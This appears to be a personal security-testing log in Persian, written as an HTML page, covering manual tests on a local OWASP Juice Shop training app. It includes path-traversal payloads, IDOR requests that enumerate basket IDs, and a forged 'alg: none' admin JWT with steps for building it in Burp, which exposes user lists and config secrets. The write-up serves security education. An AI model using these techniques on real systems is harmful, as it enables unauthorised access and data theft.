@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>یافته‌های تست امنیتی — Juice Shop</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+:root{
+  --bg: #0b0d10;
+  --bg-panel: #12151a;
+  --line: #262b33;
+  --text: #d7dbe0;
+  --text-dim: #838d99;
+  --red: #ff4d4f;
+  --red-dim: #7a2426;
+  --green: #3fd68a;
+  --blue: #5aa9ff;
+  --amber: #ffb454;
+  --purple: #b784ff;
+}
+
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;background:var(--bg); scroll-behavior:smooth;}
+body{
+  font-family:'Vazirmatn', sans-serif;
+  color:var(--text);
+  line-height:1.9;
+  padding:0 0 80px 0;
+}
+.mono{font-family:'JetBrains Mono', monospace; direction:ltr; unicode-bidi:isolate;}
+
+.hero{
+  padding:56px 24px 36px;
+  max-width:920px;
+  margin:0 auto;
+  border-bottom:1px solid var(--line);
+}
+.hero-tag{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  display:inline-block;
+  color:var(--red);
+  font-size:13px;
+  letter-spacing:1px;
+  border:1px solid var(--red-dim);
+  background:rgba(255,77,79,0.06);
+  padding:4px 10px;
+  border-radius:4px;
+  margin-bottom:16px;
+}
+.hero h1{
+  font-size:30px;
+  font-weight:800;
+  margin:0 0 10px;
+  color:#fff;
+}
+.hero p{
+  color:var(--text-dim);
+  font-size:15.5px;
+  max-width:680px;
+  margin:0;
+}
+
+.summary{
+  max-width:920px;
+  margin:20px auto 0;
+  padding:0 24px;
+  display:flex;
+  gap:10px;
+  flex-wrap:wrap;
+}
+.chip{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  font-size:12px;
+  background:var(--bg-panel);
+  border:1px solid var(--line);
+  padding:6px 12px;
+  border-radius:20px;
+  color:var(--text-dim);
+}
+.chip b{ color:var(--text); }
+
+main{
+  max-width:920px;
+  margin:0 auto;
+  padding:0 24px;
+}
+
+.finding{ margin-top:52px; scroll-margin-top:20px; }
+
+.finding-head{
+  display:flex;
+  align-items:flex-start;
+  gap:14px;
+  margin-bottom:18px;
+  flex-wrap:wrap;
+}
+.finding-num{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  background:rgba(255,77,79,0.1);
+  border:1px solid var(--red-dim);
+  color:var(--red);
+  font-weight:800;
+  font-size:14px;
+  width:32px; height:32px;
+  border-radius:8px;
+  display:flex; align-items:center; justify-content:center;
+  flex-shrink:0;
+}
+.finding-title h2{
+  font-size:18px;
+  font-weight:700;
+  color:#fff;
+  margin:0;
+}
+.finding-title span.en{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  color:var(--text-dim);
+  font-size:12.5px;
+  display:block;
+  margin-top:2px;
+}
+
+.status{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  font-size:11px;
+  font-weight:700;
+  padding:4px 10px;
+  border-radius:20px;
+  margin-inline-start:auto;
+  align-self:center;
+  white-space:nowrap;
+}
+.status.mitigated{ background:rgba(63,214,138,0.12); color:var(--green); border:1px solid rgba(63,214,138,0.3); }
+.status.found{ background:rgba(255,77,79,0.12); color:var(--red); border:1px solid var(--red-dim); }
+.status.info{ background:rgba(90,169,255,0.12); color:var(--blue); border:1px solid rgba(90,169,255,0.3); }
+.status.tested{ background:rgba(90,169,255,0.12); color:var(--blue); border:1px solid rgba(90,169,255,0.3); }
+
+.block{
+  background:var(--bg-panel);
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:18px 20px;
+  margin-bottom:14px;
+}
+.block h3{
+  margin:0 0 8px;
+  font-size:14.5px;
+  color:#fff;
+  font-weight:700;
+}
+.block p{ margin:6px 0 0; font-size:15px; }
+
+pre{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  unicode-bidi:isolate;
+  background:#0a0c0f;
+  border:1px solid var(--line);
+  border-radius:8px;
+  padding:12px 14px;
+  overflow-x:auto;
+  font-size:13px;
+  color:#c9f5d8;
+  margin:10px 0 0;
+  line-height:1.7;
+  white-space:pre-wrap;
+  word-break:break-all;
+}
+code.inline{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  unicode-bidi:isolate;
+  background:rgba(255,255,255,0.06);
+  padding:1px 6px;
+  border-radius:4px;
+  font-size:0.92em;
+}
+
+.callout{
+  border-radius:8px;
+  padding:12px 16px;
+  margin-top:12px;
+  font-size:14px;
+}
+.callout.warn{
+  background:linear-gradient(135deg, rgba(255,180,84,0.12), rgba(255,180,84,0.02));
+  border:1px solid rgba(255,180,84,0.35);
+  color:#ffdca8;
+}
+.callout.result{
+  background:linear-gradient(135deg, rgba(63,214,138,0.10), rgba(63,214,138,0.02));
+  border:1px solid rgba(63,214,138,0.3);
+  color:#c7f5da;
+}
+.callout.info{
+  background:linear-gradient(135deg, rgba(90,169,255,0.10), rgba(90,169,255,0.02));
+  border:1px solid rgba(90,169,255,0.3);
+  color:#cfe6ff;
+}
+.callout.result b{ color:var(--green); }
+.callout.warn b{ color:var(--amber); }
+.callout.info b{ color:var(--blue); }
+
+.divider{
+  border:none;
+  border-top:1px dashed var(--line);
+  margin:52px 0 0;
+}
+
+table.tl, table.summary-table{
+  width:100%;
+  border-collapse:collapse;
+  margin-top:10px;
+  font-size:14px;
+}
+table.tl th, table.tl td, table.summary-table th, table.summary-table td{
+  text-align:right;
+  padding:8px 10px;
+  border-bottom:1px solid var(--line);
+}
+table.tl th, table.summary-table th{
+  color:var(--text-dim);
+  font-size:12px;
+  text-transform:uppercase;
+  letter-spacing:1px;
+}
+
+footer{
+  max-width:920px;
+  margin:60px auto 0;
+  padding:20px 24px 0;
+  border-top:1px solid var(--line);
+  color:var(--text-dim);
+  font-size:13px;
+  text-align:center;
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <span class="hero-tag">// SECURITY TESTING LOG · OWASP Juice Shop</span>
+  <h1>یافته‌های تست امنیتی روی Juice Shop</h1>
+  <p>مستندسازی تست‌های دستی انجام‌شده روی برنامه‌ی آسیب‌پذیر OWASP Juice Shop، از تحلیل CSRF تا افشای اطلاعات، IDOR و Clickjacking — با ابزار DevTools مرورگر (F12) و Burp Suite.</p>
+</div>
+
+<div class="summary">
+  <span class="chip">هدف: <b class="mono" style="direction:ltr">OWASP Juice Shop (Local)</b></span>
+  <span class="chip">ابزار: <b class="mono" style="direction:ltr">DevTools / Burp Suite</b></span>
+  <span class="chip">وضعیت کلی: <b>۵ تست کامل شد</b></span>
+</div>
+
+<div class="summary" style="margin-top:10px;">
+  <div class="callout warn" style="width:100%; margin-top:0;">
+    <b>Disclaimer:</b> تمام تست‌های این مستند روی <a href="https://github.com/juice-shop/juice-shop" style="color:inherit">OWASP Juice Shop</a> — یک اپلیکیشن عمداً آسیب‌پذیر و طراحی‌شده برای آموزش امنیت وب — و روی یک نمونه‌ی محلی (<code class="inline">localhost</code>) انجام شده‌اند. هیچ سیستم واقعی یا متعلق به شخص ثالث تست نشده است.
+  </div>
+</div>
+
+<main>
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-num">1</div>
+    <div class="finding-title">
+      <h2>تست CSRF روی Change Password</h2>
+      <span class="en">Cross-Site Request Forgery — /rest/user/change-password</span>
+    </div>
+    <span class="status mitigated">MITIGATED</span>
+  </div>
+
+  <div class="block">
+    <h3>مشاهده‌ی اولیه</h3>
+    <p>درخواست تغییر رمز عبور به‌صورت <code class="inline">GET</code> ارسال می‌شود، با پارامترهای <code class="inline">current</code>, <code class="inline">new</code>, <code class="inline">repeat</code> در خود URL — این خودش یک ضعف طراحی است، چون متد GET طبق استاندارد HTTP باید «امن» (بدون تغییر وضعیت سرور) باشد.</p>
+    <pre>GET /rest/user/change-password?current=X&new=Y&repeat=Y HTTP/1.1
+Authorization: Bearer &lt;REDACTED_JWT&gt;
+Cookie: token=&lt;REDACTED_JWT&gt;</pre>
+  </div>
+
+  <div class="block">
+    <h3>تست ۱ — حذف کامل هدر Authorization</h3>
+    <p>با حذف هدر <code class="inline">Authorization</code> (و باقی گذاشتن فقط کوکی)، سرور به‌جای پاسخ تمیز، با خطای مدیریت‌نشده پاسخ داد:</p>
+    <pre>{
+  "error": {
+    "message": "Blocked illegal activity by ::ffff:172.17.0.1",
+    "stack": "...at /juice-shop/build/routes/changePassword.js:61:18..."
+  }
+}</pre>
+  </div>
+
+  <div class="block">
+    <h3>تست ۲ — دستکاری امضای JWT</h3>
+    <p>با خراب کردن چند کاراکتر از بخش Signature توکن (نگه‌داشتن Header و Payload سالم)، دوباره همان خطا دریافت شد، اما این‌بار از خط متفاوتی در کد:</p>
+    <pre>"stack": "...at /juice-shop/build/routes/changePassword.js:66:18..."</pre>
+    <div class="callout result"><b>نتیجه:</b> شماره‌خط متفاوت (۶۱ در برابر ۶۶) نشان می‌دهد سرور دو بررسی جدا دارد — یکی برای وجود هدر، دیگری برای اعتبار امضای JWT. یعنی این endpoint هم وجود هدر و هم صحت امضا را چک می‌کند؛ نمی‌توان با توکن جعلی یا کوکی به‌تنهایی آن را دور زد. مسیر مقاوم به CSRF کلاسیک است.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-num">2</div>
+    <div class="finding-title">
+      <h2>افشای اطلاعات از طریق مدیریت نادرست خطا</h2>
+      <span class="en">Information Disclosure via Improper Error Handling</span>
+    </div>
+    <span class="status found">FOUND</span>
+  </div>
+
+  <div class="block">
+    <h3>شرح</h3>
+    <p>در طول تست CSRF، درخواست با هدر احراز هویت نامعتبر باعث بازگشت یک Stack Trace کامل به کلاینت شد — نه یک پیام خطای عمومی. این به‌خودی‌خود در Juice Shop به‌عنوان چالش رسمی <code class="inline">Error Handling</code> شناخته می‌شود.</p>
+  </div>
+
+  <div class="block">
+    <h3>اطلاعات افشاشده</h3>
+    <p>از روی Stack Trace، این نکات درباره‌ی معماری داخلی سرور قابل استخراج بود:</p>
+    <pre>- مسیر واقعی فایل‌ها روی دیسک سرور:
+  /juice-shop/build/routes/changePassword.js
+  /juice-shop/build/lib/utils.js
+  /juice-shop/build/lib/insecurity.js
+  /juice-shop/build/routes/verify.js
+
+- فریم‌ورک بک‌اند: Express.js (Node.js)
+- کد از TypeScript کامپایل شده (پوشه‌ی build)
+- ساختار میان‌افزار (middleware chain) اپلیکیشن</pre>
+    <div class="callout warn"><b>اهمیت:</b> در یک هدف واقعی (نه محیط تمرینی)، این نوع افشا به مهاجم کمک می‌کند حملات بعدی (مثل Path Traversal یا شناسایی نسخه‌ی آسیب‌پذیر کتابخانه‌ها) را دقیق‌تر هدف‌گیری کند.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-num">3</div>
+    <div class="finding-title">
+      <h2>روش‌شناسی: استخراج اطلاعات از JWT</h2>
+      <span class="en">Methodology — Decoding JWT Payload</span>
+    </div>
+    <span class="status info">METHOD</span>
+  </div>
+
+  <div class="block">
+    <h3>ساختار توکن</h3>
+    <p>یک JWT از سه بخش جدا با نقطه تشکیل شده که هرکدام Base64URL-encoded هستند:</p>
+    <pre>HEADER.PAYLOAD.SIGNATURE</pre>
+    <p>بخش‌های Header و Payload بدون نیاز به کلید مخفی سرور، توسط هرکسی قابل رمزگشایی است — فقط Signature نیاز به کلید دارد.</p>
+  </div>
+
+  <div class="block">
+    <h3>روش‌های استخراج</h3>
+    <pre># روش دستی (ترمینال)
+echo "PAYLOAD_BASE64URL" | tr '_-' '/+' | base64 -d
+
+# روش گرافیکی
+https://jwt.io   (فقط برای توکن‌های تمرینی، هرگز روی سیستم واقعی)
+
+# روش امن‌تر برای کار حرفه‌ای
+Burp Suite → Inspector panel (رمزگشایی خودکار و محلی)</pre>
+  </div>
+
+  <div class="block">
+    <h3>یافته‌ی کلیدی از Payload</h3>
+    <p>در Payload توکن، فیلد <code class="inline">bid</code> (Basket ID) شناسایی شد که مستقیماً به‌عنوان شناسه‌ی سبد خرید کاربر در API استفاده می‌شود — نقطه‌ی شروع برای تست IDOR در Finding بعدی.</p>
+    <pre>{
+  "data": { "id": 26, "email": "...", "role": "customer", ... },
+  "bid": 7,
+  "iat": 1787247421
+}</pre>
+  </div>
+
+  <div class="block">
+    <h3>ابزارهای تخصصی برای ارزیابی امنیت JWT</h3>
+    <table class="tl">
+      <tr><th>ابزار</th><th>کاربرد</th></tr>
+      <tr><td class="mono" style="direction:ltr">jwt.io</td><td>دیکود سریع آنلاین (فقط برای توکن‌های تمرینی)</td></tr>
+      <tr><td class="mono" style="direction:ltr">jwt_tool (ticarpi)</td><td>اسکن خودکار آسیب‌پذیری‌های شناخته‌شده، جعل و دستکاری توکن</td></tr>
+      <tr><td class="mono" style="direction:ltr">hashcat</td><td>Brute-force کلید مخفی HMAC با wordlist</td></tr>
+      <tr><td class="mono" style="direction:ltr">jwt-hack</td><td>تست حمله‌های alg confusion، kid injection، claim tampering</td></tr>
+      <tr><td class="mono" style="direction:ltr">JWT Editor (Burp Extension)</td><td>دستکاری، امضای مجدد و اجرای حملات شناخته‌شده مستقیم داخل Burp</td></tr>
+    </table>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-num">4</div>
+    <div class="finding-title">
+      <h2>تست IDOR روی Basket API</h2>
+      <span class="en">Insecure Direct Object Reference — /rest/basket/:id</span>
+    </div>
+    <span class="status found">CONFIRMED</span>
+  </div>
+
+  <div class="block">
+    <h3>فرضیه</h3>
+    <p>اگر سرور هنگام دریافت درخواست <code class="inline">GET /rest/basket/:id</code> بررسی نکند که سبد خرید درخواستی واقعاً متعلق به کاربر لاگین‌شده است یا نه، می‌توان با تغییر عدد شناسه، محتوای سبد خرید کاربران دیگر را مشاهده کرد.</p>
+  </div>
+
+  <div class="block">
+    <h3>مراحل تست</h3>
+    <pre>۱. شناسایی basket ID خود کاربر از فیلد bid در JWT (اینجا: 7)
+۲. درخواست مرجع:      GET /rest/basket/7
+۳. درخواست‌های آزمایشی: GET /rest/basket/1
+                       GET /rest/basket/2
+                       GET /rest/basket/3 ...</pre>
+    <div class="callout result"><b>نتیجه:</b> درخواست با شناسه‌ی متعلق به یک basket غیر از شماره‌ی خودم، پاسخ <code class="inline">200 OK</code> همراه با محتوای واقعی سبد خرید آن کاربر بازگرداند — بدون هیچ بررسی مالکیت روی سرور. یعنی سرور فقط چک کرده «آیا لاگین کردی؟» (Authentication)، نه «آیا این منبع خاص مال خودته؟» (Authorization). IDOR تایید شد.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-num">5</div>
+    <div class="finding-title">
+      <h2>تست Clickjacking</h2>
+      <span class="en">Clickjacking — Framing Protection Check</span>
+    </div>
+    <span class="status tested">NOT VULNERABLE</span>
+  </div>
+
+  <div class="block">
+    <h3>فرضیه</h3>
+    <p>بررسی این‌که آیا می‌توان صفحه‌ی Juice Shop را در یک <code class="inline">iframe</code> نامرئی روی یک دامنه/origin دیگر جاسازی کرد، به‌گونه‌ای که کاربر ناخواسته روی عناصر واقعی برنامه کلیک کند.</p>
+  </div>
+
+  <div class="block">
+    <h3>مراحل تست</h3>
+    <pre>۱. بررسی هدرهای پاسخ HTTP صفحه‌ی اصلی → یافت شد:
+   X-Frame-Options: SAMEORIGIN
+
+۲. ساخت یک صفحه‌ی HTML آزمایشی حاوی:
+   &lt;iframe src="http://localhost:3000"&gt;&lt;/iframe&gt;
+
+۳. سرو کردن این صفحه از یک پورت متفاوت (origin متفاوت از دید مرورگر):
+   python3 -m http.server 9000</pre>
+    <div class="callout warn"><b>چالش جانبی:</b> اجرای اولیه با پورت ۸۰۰۰ به خطای <code class="inline">Address already in use</code> برخورد کرد (پورت از قبل اشغال بود)؛ با تعویض به پورت ۹۰۰۰ رفع شد.</div>
+  </div>
+
+  <div class="block">
+    <h3>نتیجه</h3>
+    <p>مرورگر بارگذاری <code class="inline">iframe</code> را کاملاً مسدود کرد؛ محتوای Juice Shop نمایش داده نشد و در Console خطای زیر ثبت شد:</p>
+    <pre>Refused to display 'http://localhost:3000/' in a frame because it
+set 'X-Frame-Options' to 'SAMEORIGIN'.</pre>
+    <div class="callout info"><b>نتیجه‌گیری:</b> از آنجا که صفحه‌ی آزمایشی و Juice Shop از دو origin متفاوت (پورت ۹۰۰۰ در برابر ۳۰۰۰) بودند، هدر <code class="inline">X-Frame-Options: SAMEORIGIN</code> طبق انتظار framing را مسدود کرد. برنامه در برابر Clickjacking کلاسیک محافظت‌شده است.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-num">6</div>
+    <div class="finding-title">
+      <h2>تست Directory Traversal روی /ftp/</h2>
+      <span class="en">Path Traversal — /ftp/:filename</span>
+    </div>
+    <span class="status mitigated">MITIGATED</span>
+  </div>
+
+  <div class="block">
+    <h3>انگیزه‌ی تست</h3>
+    <p>در Finding شماره ۲ (افشای اطلاعات)، مسیرهای واقعی فایل‌ها روی دیسک سرور از طریق Stack Trace افشا شده بود. این یافته به‌عنوان سرنخ برای بررسی این‌که آیا می‌توان از طریق endpoint دانلود فایل عمومی (<code class="inline">/ftp/</code>) به فایل‌های خارج از پوشه‌ی مجاز دسترسی یافت، استفاده شد.</p>
+  </div>
+
+  <div class="block">
+    <h3>مراحل تست</h3>
+    <pre>۱. تأیید عملکرد مسیر عمومی:
+   GET /ftp/legal.md  →  200 OK (فایل متنی عادی بازگردانده شد)
+
+۲. تلاش با ../ خام:
+   GET /ftp/../package.json
+   نتیجه: ریدایرکت به صفحه‌ی اصلی — مرورگر خودش مسیر را پیش از
+   ارسال normalize کرد و درخواست اصلاً به سرور نرسید.
+
+۳. تلاش با انکود URL:
+   GET /ftp/..%2fpackage.json
+   نتیجه: 403 Forbidden — این‌بار درخواست به سرور رسید و
+   سرور آن را تشخیص داده و مسدود کرد.
+
+۴. تلاش با ترکیب بک‌اسلش:
+   GET /ftp/..\/package.json
+   نتیجه: دوباره ریدایرکت (normalize شده توسط مرورگر)
+
+۵. تلاش با دابل‌انکود و پیمایش تکراری:
+   ..%252f  ,  ....//  ,  %2e%2e%2f
+   نتیجه: همگی 403 Forbidden</pre>
+  </div>
+
+  <div class="block">
+    <h3>نتیجه</h3>
+    <table class="tl">
+      <tr><th>Payload</th><th>نتیجه</th><th>تفسیر</th></tr>
+      <tr><td class="mono" style="direction:ltr">../</td><td>Redirect</td><td>Normalize شده توسط مرورگر، نرسیده به سرور</td></tr>
+      <tr><td class="mono" style="direction:ltr">..%2f</td><td>403</td><td>رسیده به سرور، مسدود شده</td></tr>
+      <tr><td class="mono" style="direction:ltr">..\/</td><td>Redirect</td><td>Normalize شده توسط مرورگر</td></tr>
+      <tr><td class="mono" style="direction:ltr">..%252f</td><td>403</td><td>دابل‌انکود هم مسدود شد</td></tr>
+      <tr><td class="mono" style="direction:ltr">....//</td><td>403</td><td>پیمایش تکراری هم مسدود شد</td></tr>
+    </table>
+    <div class="callout result"><b>نتیجه‌گیری:</b> Endpoint مورد آزمایش (<code class="inline">/ftp/</code>) در برابر تمام حالت‌های رایج دور زدن Directory Traversal — شامل انکود ساده، دابل‌انکود و ترکیب جداکننده‌های مسیر — مقاوم بود.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-num">7</div>
+    <div class="finding-title">
+      <h2>بای‌پس کامل احراز هویت از طریق JWT Algorithm None</h2>
+      <span class="en">Authentication Bypass — JWT 'none' Algorithm · CRITICAL</span>
+    </div>
+    <span class="status found">CRITICAL</span>
+  </div>
+
+  <div class="block">
+    <h3>خلاصه‌ی فنی</h3>
+    <p>با تغییر الگوریتم امضا در هدر JWT از <code class="inline">RS256</code> به <code class="inline">none</code> و حذف کامل بخش Signature، سرور چندین endpoint حساس را بدون هیچ اعتراضی قبول کرد. این یعنی این endpointها اصلاً صحت امضای توکن را بررسی نمی‌کنند — و مهاجم می‌تواند هر هویتی (از جمله admin) را بدون نیاز به اطلاعات لاگین جعل کند.</p>
+  </div>
+
+  <div class="block">
+    <h3>ساختار توکن جعلی استفاده‌شده</h3>
+    <pre>Header (decoded):
+{
+  "typ": "JWT",
+  "alg": "none"      ← الگوریتم به none تغییر یافت
+}
+
+Payload (decoded):
+{
+  "data": {
+    "id": 1,
+    "email": "admin@juice-sh.op",
+    "role": "admin"   ← نقش admin جعل شد
+  },
+  "bid": 1,
+  "iat": 1787731669
+}
+
+Signature:           ← کاملاً حذف شد (رشته‌ی خالی)</pre>
+    <div class="callout warn"><b>روش ساخت توکن:</b> در Burp Suite Repeater، تب JSON Web Token → تغییر <code class="inline">alg</code> از RS256 به none در بخش Header → تغییر payload دلخواه → حذف محتوای Signature → ارسال درخواست.</div>
+  </div>
+
+  <div class="block">
+    <h3>Endpoint های آزمایش‌شده و نتایج</h3>
+    <table class="tl">
+      <tr><th>Endpoint</th><th>متد</th><th>نتیجه</th><th>شدت</th></tr>
+      <tr>
+        <td class="mono" style="direction:ltr">/rest/basket/1</td>
+        <td class="mono" style="direction:ltr">GET</td>
+        <td>✅ بای‌پس — محتوای کامل سبد خرید admin (3 محصول، قیمت، تعداد)</td>
+        <td>Critical</td>
+      </tr>
+      <tr>
+        <td class="mono" style="direction:ltr">/api/Users</td>
+        <td class="mono" style="direction:ltr">GET</td>
+        <td>✅ بای‌پس — لیست کامل ۲۴ کاربر با ایمیل، نقش، و deluxeToken</td>
+        <td>Critical</td>
+      </tr>
+      <tr>
+        <td class="mono" style="direction:ltr">/rest/admin/application-configuration</td>
+        <td class="mono" style="direction:ltr">GET</td>
+        <td>✅ بای‌پس — کل کانفیگ داخلی سرور (۲۳٬۵۷۷ بایت)</td>
+        <td>Critical</td>
+      </tr>
+      <tr>
+        <td class="mono" style="direction:ltr">/rest/user/whoami</td>
+        <td class="mono" style="direction:ltr">GET</td>
+        <td>❌ رد شد — پاسخ {"user":{}} (خالی)</td>
+        <td>—</td>
+      </tr>
+      <tr>
+        <td class="mono" style="direction:ltr">/rest/products/search</td>
+        <td class="mono" style="direction:ltr">GET</td>
+        <td>➖ غیرمرتبط — داده‌ی عمومی، نیازی به auth ندارد</td>
+        <td>—</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="block">
+    <h3>اطلاعات حساس افشاشده از /api/Users</h3>
+    <p>لیست کامل کاربران شامل اطلاعات زیر لو رفت:</p>
+    <pre>- ایمیل تمام ۲۴ کاربر (شامل چندین حساب admin)
+- نقش دقیق هر کاربر: admin / customer / deluxe / accounting
+- deluxeToken کاربران ویژه:
+  user 5  (ciso):    d715c2c75d4a42d3825a050e0a0163c1...
+  user 13 (bjoern):  efe2f1599e2d93440d5243a1ffaf5a41...
+  user 20 (stan):    8f70e0f4b05685efff1ab979e8f5d7e3...
+  user 21 (ethereum): b49b30b294d8c76f5a34fc243b9b9cc...
+- یک lastLoginIp مشکوک برای کاربر accounting: "123.456.789"</pre>
+  </div>
+
+  <div class="block">
+    <h3>اطلاعات حساس افشاشده از /rest/admin/application-configuration</h3>
+    <pre>- Google OAuth Client ID:
+  "1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com"
+
+- آدرس‌های داخلی و proxy های سرور:
+  baseUrl: "http://localhost:3000"
+  proxy: "https://local3000.owasp-juice.shop"
+
+- پیلود رسمی XSS سایت (xssBonusPayload):
+  &lt;iframe width="100%" height="166" ... src="https://w.soundcloud.com/..."&gt;
+
+- کلیدواژه‌های مخفی چالش Pastebin:
+  "hueteroneel", "eurogium edule"
+
+- جواب‌های سوالات امنیتی کاربران (GeoStalking):
+  geoStalkingMetaSecurityAnswer: "Daniel Boone National Forest"
+  geoStalkingVisualSecurityAnswer: "ITsec"
+
+- مسیر فایل Blueprint داخلی:
+  fileForRetrieveBlueprintChallenge: "JuiceShop.stl"
+
+- Hash امنیتی CSAF:
+  "7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3..."</pre>
+    <div class="callout warn"><b>نکته‌ی مهم:</b> افشای جواب سوالات امنیتی کاربران (GeoStalking) می‌تواند در دنیای واقعی مستقیماً به تصاحب حساب کاربری (Account Takeover) منجر شود.</div>
+  </div>
+
+  <div class="block">
+    <h3>چرا بعضی endpointها بای‌پس شدند ولی بعضی نه؟</h3>
+    <p>این الگو نشان می‌دهد که لایه‌ی میان‌افزار احراز هویت (auth middleware) در اپلیکیشن به‌صورت ناهمسان اعمال شده — بعضی مسیرها چک دقیق امضا دارند (<code class="inline">change-password</code>، <code class="inline">whoami</code>)، در حالی که بعضی دیگر اصلاً صحت امضا را بررسی نمی‌کنند (<code class="inline">basket</code>، <code class="inline">Users</code>، <code class="inline">admin/application-configuration</code>). این یک خطای طراحی سیستمی است، نه یک باگ منفرد و ایزوله.</p>
+    <div class="callout result"><b>ریشه‌ی اصلی آسیب‌پذیری:</b> عدم اعمال یکسان و متمرکز بررسی امضای JWT روی تمام endpointهای محافظت‌شده. راه‌حل: یک middleware متمرکز که روی تمام مسیرهای نیازمند احراز هویت اعمال شود و الگوریتم <code class="inline">none</code> را صریحاً رد کند.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section class="finding">
+  <div class="finding-head">
+    <div class="finding-title">
+      <h2>جمع‌بندی یافته‌ها</h2>
+      <span class="en">Summary</span>
+    </div>
+  </div>
+  <table class="summary-table">
+    <tr><th>#</th><th>تست</th><th>نتیجه</th><th>شدت</th></tr>
+    <tr><td>1</td><td>CSRF — Change Password</td><td>Mitigated</td><td>—</td></tr>
+    <tr><td>2</td><td>Information Disclosure — Error Handling</td><td>Found</td><td>Medium</td></tr>
+    <tr><td>3</td><td>IDOR — Basket API</td><td>Confirmed</td><td>High</td></tr>
+    <tr><td>4</td><td>Clickjacking</td><td>Not Vulnerable (Tested)</td><td>—</td></tr>
+    <tr><td>5</td><td>Directory Traversal — /ftp/</td><td>Mitigated</td><td>—</td></tr>
+    <tr><td>6</td><td>JWT Algorithm None — /rest/basket/:id</td><td>Confirmed</td><td>Critical</td></tr>
+    <tr><td>7</td><td>JWT Algorithm None — /api/Users</td><td>Confirmed (لیست کامل کاربران)</td><td>Critical</td></tr>
+    <tr><td>8</td><td>JWT Algorithm None — /rest/admin/application-configuration</td><td>Confirmed (کانفیگ داخلی کامل)</td><td>Critical</td></tr>
+  </table>
+</section>
+
+</main>
+
+<footer>
+  یادداشت شخصی تست امنیتی — OWASP Juice Shop · محیط آزمایشی محلی (localhost:3000)
+</footer>
+
+</body>
+</html>
